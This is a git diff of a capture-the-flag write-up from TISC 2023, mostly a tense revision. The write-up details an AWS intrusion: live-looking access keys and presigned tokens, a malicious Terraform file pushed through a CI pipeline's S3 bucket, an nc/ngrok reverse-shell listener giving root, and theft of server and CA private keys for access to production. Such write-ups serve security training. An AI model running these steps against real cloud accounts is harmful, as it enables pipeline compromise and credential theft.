@@ -21,11 +21,11 @@ The onboarding guide website is shown below:
 
 ![](/assets/images/tisc2023/Pasted image 20231002202731.png)
 
-It looks like the first step is to submit some details via the first link, which points to `https://61lxjmt991.execute-api.ap-southeast-1.amazonaws.com/development/generate`. Upon clicking on it, the browser shows 2 different URLs:
+It looked like the first step was to submit some details via the first link, which pointed to `https://61lxjmt991.execute-api.ap-southeast-1.amazonaws.com/development/generate`. Upon clicking on it, the browser showed 2 different URLs:
 
 ![](/assets/images/tisc2023/Pasted image 20231002202815.png)
 
-The `csr` link seems like a link for a certificate signing request (CSR), whereas the `crt` seems like a link for a certificate (CRT). However, upon clicking either links, the browser is met with errors:
+The `csr` link seemed like a link for a certificate signing request (CSR), whereas the `crt` seemed like a link for a certificate (CRT). However, upon clicking on either links, the browser was met with errors:
 
 `csr` link:  
 ![](/assets/images/tisc2023/Pasted image 20231002202841.png)
@@ -37,7 +37,7 @@ Returning back to the onboarding guide and scrolling further down, there was als
 
 ![](/assets/images/tisc2023/Pasted image 20231002202746.png)
 
-Hence, the first guess was that the `csr` link is likely for uploading a CSR whereas the `crt` link is likely for downloading the signed certificate after the uploaded CSR has been processed by a certificate authority (CA) somewhere.
+Hence, I guessed that the `csr` link was likely for uploading a CSR whereas the `crt` link was likely for downloading the signed certificate after the uploaded CSR has been processed by a certificate authority (CA) somewhere.
 
 Searching about these links provided more details as to how they can be used:
 
@@ -47,7 +47,7 @@ Searching about these links provided more details as to how they can be used:
 > 
 > When someone uses the URL to upload an object, Amazon S3 creates the object in the specified bucket. If an object with the same key that is specified in the presigned URL already exists in the bucket, Amazon S3 replaces the existing object with the uploaded object. After upload, the bucket owner will own the object.
 
-The `csr` link was a presigned URL where a CSR can be uploaded to. A CSR can be generated like so:
+The `csr` link was a presigned URL where a CSR can be uploaded to. A CSR was generated like so:
 
 ```bash
 $ openssl genrsa -out client.key 2048 
@@ -73,7 +73,7 @@ A challenge password []:
 An optional company name []:
 ```
 
-This creates a private key `client.key` and a CSR `client.csr`. The `client.csr` can then be uploaded to the `csr` URL like so:
+This created a private key `client.key` and a CSR `client.csr`. The `client.csr` could then be uploaded to the `csr` URL like so:
 
 ```bash
 $ curl -i --upload-file ./client.csr "https://devsecmeow2023certs.s3.amazonaws.com/1696250041-0b5bce67dd5341e897207f159bd3c37e/client.csr?AWSAccessKeyId=ASIATMLSTF3NZZB7IZOL&Signature=nNEmfksn%2FkRPDoSJHRnl9G3K4c0%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEA0aDmFwLXNvdXRoZWFzdC0xIkgwRgIhAMbpT4mTXSVDOmSd8%2BeuLdaG%2Fp%2F0SXyFkKU%2Fkg2qmSZJAiEArw1z6pbLyylU7k8XYzuQ1TPWgbJqlomdrxnHDfqPexEqkAMIFhAAGgwyMzI3MDU0Mzc0MDMiDI6u0S129d4YDYHiEyrtAnLGsc8RsmhIhjGEl0hSHRuDBtJQ0sIP7D%2B86aiz4ob3UuqhBb4%2BtcvwPBpaYQzopUzVabkjvQsJR5pYoyjvyAVJAGtV3y5kLqIu0hwfgfIlOGduJZ3MGczC6swLAriOntTiqTbSifxPPHZnsqH%2BOhMuj5k%2F79h4JsFTWaMrU4e4kobWjQARkz6QQQs5HjhZ5CkCF8os2nRek1E118C%2BX%2BAo2soSMSS0OJ2kdM9ieNJyEJ2W45Y5xY9ii6%2B2jKqzbuQ75fZFvmW8RqJ4n%2BrD7iKr1CmJjOzRgwAdZ3r4Qx%2BTjfmZn%2FOQaPQoXztm%2BNzI%2BgrFReBmv9Gr2xW9oTMQoy%2F8Zb25AlBj2%2FLnSCSWLlyCRAdQiRs3ROqojVHm%2BXVN4w3uGfN%2BFDcDmbGOVIN%2ByhVvLpmB9j27TWJlcyKCEZ5CAReYn%2F8tcw1DeXXl995UT9kRG3W3WvXiZpZBDhgByZjzFizUfg8LJAzPYJ9QMMfu6qgGOpwBpzW741Y2%2FkK%2FuXBfFRN8IorSI3P8I%2BtPMuQr7gBUH8Cm6ZnlYoHa8lra9KuRR3lx13OpAqmCXtBMiGwi9KcPCilPT3X724BuzLVeet2Jtr%2B9ec7j21HZTd9KcwVT2SLjMN0zcGeFKz%2FV51iG64J6PZjQrkyxwxgoahZq5Vb%2FhaejXwDh%2FI1Huktm93RlNb6btC2%2B8%2B2%2F5%2BTkDArK&Expires=1696250641" 
@@ -87,13 +87,13 @@ Server: AmazonS3
 Content-Length: 0
 ```
 
-Then, the signed certificate is downloaded using the `crt` URL like so:
+The signed certificate was then downloaded via `crt` URL like so:
 
 ```bash
 $ curl "https://devsecmeow2023certs.s3.amazonaws.com/1696250041-0b5bce67dd5341e897207f159bd3c37e/client.crt?AWSAccessKeyId=ASIATMLSTF3NZZB7IZOL&Signature=xtLlCxg4yANf6a0pO2QqAHocZXk%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEA0aDmFwLXNvdXRoZWFzdC0xIkgwRgIhAMbpT4mTXSVDOmSd8%2BeuLdaG%2Fp%2F0SXyFkKU%2Fkg2qmSZJAiEArw1z6pbLyylU7k8XYzuQ1TPWgbJqlomdrxnHDfqPexEqkAMIFhAAGgwyMzI3MDU0Mzc0MDMiDI6u0S129d4YDYHiEyrtAnLGsc8RsmhIhjGEl0hSHRuDBtJQ0sIP7D%2B86aiz4ob3UuqhBb4%2BtcvwPBpaYQzopUzVabkjvQsJR5pYoyjvyAVJAGtV3y5kLqIu0hwfgfIlOGduJZ3MGczC6swLAriOntTiqTbSifxPPHZnsqH%2BOhMuj5k%2F79h4JsFTWaMrU4e4kobWjQARkz6QQQs5HjhZ5CkCF8os2nRek1E118C%2BX%2BAo2soSMSS0OJ2kdM9ieNJyEJ2W45Y5xY9ii6%2B2jKqzbuQ75fZFvmW8RqJ4n%2BrD7iKr1CmJjOzRgwAdZ3r4Qx%2BTjfmZn%2FOQaPQoXztm%2BNzI%2BgrFReBmv9Gr2xW9oTMQoy%2F8Zb25AlBj2%2FLnSCSWLlyCRAdQiRs3ROqojVHm%2BXVN4w3uGfN%2BFDcDmbGOVIN%2ByhVvLpmB9j27TWJlcyKCEZ5CAReYn%2F8tcw1DeXXl995UT9kRG3W3WvXiZpZBDhgByZjzFizUfg8LJAzPYJ9QMMfu6qgGOpwBpzW741Y2%2FkK%2FuXBfFRN8IorSI3P8I%2BtPMuQr7gBUH8Cm6ZnlYoHa8lra9KuRR3lx13OpAqmCXtBMiGwi9KcPCilPT3X724BuzLVeet2Jtr%2B9ec7j21HZTd9KcwVT2SLjMN0zcGeFKz%2FV51iG64J6PZjQrkyxwxgoahZq5Vb%2FhaejXwDh%2FI1Huktm93RlNb6btC2%2B8%2B2%2F5%2BTkDArK&Expires=1696250641" -o client.crt 
 ```
 
-Here are the details of the signed certificate:
+Here were the details of the signed certificate:
 
 ```bash
 $ openssl x509 -in client.crt -text -noout     
@@ -150,24 +150,24 @@ Certificate:
         0a:ff:77:cc
 ```
 
-On inspection, the certificate was issued by `devsecmeow-staging`. 
+On inspection, we see that the certificate was issued by `devsecmeow-staging`. 
 
 The next step would be to generate temporary credentials using the link `https://13.213.29.24/`. However, the browser was met with a 403 forbidden:
 
 ![](/assets/images/tisc2023/Pasted image 20231002202905.png)
 
-The onboarding guide mentioned something about mTLS, which stands for Mutual TLS. This meant that a particular set of certificates and private keys are needed to communicate with this web server. Checking the certificate presented by this web server:
+The onboarding guide mentioned something about mTLS, which stood for Mutual TLS. This meant that a particular set of certificates and private keys were necessary to communicate with this web server. Checking the certificate presented by this web server:
 
 ![](/assets/images/tisc2023/Pasted image 20231002203909.png)
 
-Seeing that the issuer was also `devsecmeow-staging`, there is a high chance that the signed certificate generated earlier would work. Now, to generate the temporary credentials:
+Seeing that the issuer was also `devsecmeow-staging`, hence there was a high chance that the signed certificate generated earlier would work. Now, to generate the temporary credentials:
 
 ```bash
 $ curl -k --cert ./client.crt --key client.key https://13.213.29.24/    
 {"Message": "Hello new agent, use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIATMLSTF3N6SIFPQ65", "Secret_Key": "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"} 
 ```
 
-The access key and secret key can be loaded into the shell like so:
+The access key and secret key were then loaded into the shell like so:
 
 ```bash
 $ aws configure 
@@ -177,7 +177,7 @@ Default region name [None]: ap-southeast-1
 Default output format [None]: json
 ```
 
-Checking to see if the credentials are loaded correctly and valid:
+Checking to see if the credentials were loaded correctly and valid:
 
 ```bash
 $ aws sts get-caller-identity
@@ -188,7 +188,7 @@ $ aws sts get-caller-identity
 }
 ```
 
-It seems that the temporary credentials belong to that of `agent-3af8b74b5a024b3095e0ca0b060cdc0e`. To see what this account can do:
+It seemed that the temporary credentials belong to that of `agent-3af8b74b5a024b3095e0ca0b060cdc0e`. To see what this account can do:
 
 ```bash
 $ aws iam list-attached-user-policies --user-name agent-3af8b74b5a024b3095e0ca0b060cdc0e
@@ -259,7 +259,7 @@ $ aws iam get-policy-version --version-id v1 --policy-arn arn:aws:iam::232705437
 }
 ```
 
-First thing to check was `devsecmeow-pipeline`, which the account had `GetPipeline` permissions to. This can be done like so:
+The first thing I checked was `devsecmeow-pipeline`, which the account had `GetPipeline` permissions to. This was done like so:
 
 ```bash
 $ aws codepipeline get-pipeline --name devsecmeow-pipeline
@@ -359,7 +359,7 @@ In AWS, CodePipeline is used to automate the building and releasing of software 
 1. Monitors for new changes to a file called `rawr.zip` that is stored in a S3 bucket called `devsecmeow2023zip`.
 2. Kickstarts the build process according to the `devsecmeow-build` CodeBuild project.
 
-More details about the `devsecmeow-build` CodeBuild project can be shown like so:
+More details about the `devsecmeow-build` CodeBuild project was shown like so:
 
 ```bash
 $ aws codebuild batch-get-projects --names devsecmeow-build          
@@ -521,18 +521,18 @@ Here are the information that are worth noting:
     }
     ```
 
-Based on these details, getting a shell on the build was paramount as doing so would allow for the access to the first part of the flag (which can be read via the environment variables) and access to the `codebuild-role` role (which had the `ec2:DescribeInstance*` permissions).
+Based on these details, getting a shell on the build was paramount as doing so would have allowed for the access to the first part of the flag (which can be read via the environment variables) and access to the `codebuild-role` role (which had the `ec2:DescribeInstance*` permissions).
 
-Based on the `buildspec` earlier, it performs a `terraform init`. Hence, the first step would be to create a malicious Terraform file that would spawn a reverse shell when `terraform init` is performed, which is referenced from https://cloud.hacktricks.xyz/pentesting-ci-cd/terraform-security#terraform-plan.
+Based on the `buildspec` earlier, it performs a `terraform init`. Hence, the first step would be to create a malicious Terraform file that would spawn a reverse shell when the `terraform init` command is executed. (See https://cloud.hacktricks.xyz/pentesting-ci-cd/terraform-security#terraform-plan)
 
-A listener is created like so:
+A listener was created like so:
 
 ```bash
 $ nc -lvnp 1337             
 listening on [any] 1337 ...
 ```
 
-And then the listener is made publicly reachable using `ngrok`:
+And the listener was made publicly reachable using `ngrok`:
 
 ```bash
 $ ngrok tcp 1337
@@ -545,7 +545,7 @@ Web Interface                 http://127.0.0.1:4040
 Forwarding                    tcp://0.tcp.ap.ngrok.io:XXXX -> localhost:1337
 ```
 
-Using the hostname and port number provided by `ngrok`, the following Terraform file is created:
+Using the hostname and port number provided by `ngrok`, the following Terraform file was created:
 
 `pwn.tf`:
 ```hcl
@@ -556,21 +556,21 @@ data "external" "example" {
 
 With the malicious Terraform file created, the next step would be to upload it as `rawr.zip` to the `devsecmeow2023zip` bucket. Fortunately, the current account has `PutObject` permissions to the `devsecmeow2023zip` bucket.
 
-The `pwn.tf` is zipped up as `rawr.zip` like so:
+The `pwn.tf` was zipped up as `rawr.zip` like so:
 
 ```bash
 $ zip rawr.zip pwn.tf 
   adding: pwn.tf (deflated 8%)
 ```
 
-And the `rawr.zip` is uploaded to the `devsecmeow2023zip` bucket:
+And the `rawr.zip` was uploaded to the `devsecmeow2023zip` bucket:
 
 ```bash
 $ aws s3 cp ./rawr.zip s3://devsecmeow2023zip/rawr.zip
 upload: ./rawr.zip to s3://devsecmeow2023zip/rawr.zip 
 ```
 
-After a while, a reverse shell connection is caught on the listener:
+After a while, a reverse shell connection was caught on the listener:
 
 ```bash
 $ nc -lvnp 1337
@@ -583,7 +583,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Since the first part of the flag is injected into the environment variables, it can be obtained by using the `env` command:
+Since the first part of the flag was injected into the environment variables, it was obtained by using the `env` command:
 
 ```bash
 sh-5.2# env
@@ -595,7 +595,7 @@ flag1=TISC{pr0tecT_
 
 > `flag1` is `TISC{pr0tecT_`.
 
-Normally the next step would be to reach out to the AWS metadata URL and generate temporary credentials, but since the reverse shell session is rather stable, it would be used to enumerate further.
+Normally the next step would be to reach out to the AWS metadata URL and generate temporary credentials, but since the reverse shell session was rather stable, it would be used to enumerate further.
 
 Since the `codebuild-role` has the  `ec2:DescribeInstance*` rights, the `DescribeInstances` action can be used to list all existing EC2 virtual machines:
 
@@ -892,15 +892,15 @@ aws ec2 describe-instances
 }
 ```
 
-Based on the output, there are two EC2 instances:
+Based on the output, there were two EC2 instances:
 1. IPv4 Address: `54.255.155.134`
 2. IPv4 Address: `13.213.29.24`
 
-Since `13.213.29.24` was the staging server, it can be deduced that `54.255.155.134` is likely the production server. 
+Since `13.213.29.24` was the staging server, it could be deduced that `54.255.155.134` was likely the production server. 
 
 ![](/assets/images/tisc2023/Pasted image 20231002210630.png)
 
-The production server may also be configured for mTLS, hence the previous private key and certificate were used again:
+The production server may also be configured for mTLS, I used the previous private key and certificate again:
 
 ```bash
 $ curl -k --cert ./client.crt --key client.key https://54.255.155.134 
@@ -914,7 +914,7 @@ $ curl -k --cert ./client.crt --key client.key https://54.255.155.134
 </html>
 ```
 
-Unforunately it seems they were not accepted. Returning back to enumerating more about the production server, the `userData` field in an EC2 instance is normally used to contain a script that it runs after it is started, which can viewed like so:
+Unforunately it seemed they were not accepted. Returning back to enumerating more about the production server, the `userData` field in an EC2 instance is normally used to contain a script that is executed after it is started, which can viewed like so:
 
 ```bash
 sh-5.2# aws ec2 describe-instance-attribute --instance-id i-02602bf0cf92a4ee1 --attribute userData
@@ -927,7 +927,7 @@ sh-5.2# aws ec2 describe-instance-attribute --instance-id i-02602bf0cf92a4ee1 --
 }
 ```
 
-The `userData` field contains a base64-encoded string, which when decoded, looks like this:
+The `userData` field contained a base64-encoded string, which when decoded, looked like this:
 
 ```bash
 #!/bin/bash
@@ -1145,13 +1145,13 @@ rm /tmp/index.html
 sudo systemctl restart nginx
 ```
 
-There are several things to note in this script:
+There were several things to note in this script:
 1. Server private key (`server.key`) and certificate (`server.crt`) 
 2. CA private key (`ca.key`) and certificate (`ca.crt`)
-3. The reverse proxy configuration to `flag_server`, which is a virtual host hosted on the same web server and is serving pages from `/var/www/html`
-4. The `index.html` from the S3 bucket `devsecmeow2023flag2` that is copied to `/var/www/html`
+3. The reverse proxy configuration to `flag_server`, which was a virtual host hosted on the same web server and was serving pages from `/var/www/html`
+4. The `index.html` from the S3 bucket `devsecmeow2023flag2` that was copied to `/var/www/html`
 
-With the `server.key` and `server.crt` that should already been signed by the production environment's issuer, they can be used to access the production web server to get the second part of the flag like so:
+With the `server.key` and `server.crt` that should already been signed by the production environment's issuer, they could be used to access the production web server to get the second part of the flag like so:
 
 ```bash
 $ curl -k --cert ./server.crt --key server.key https://54.255.155.134/
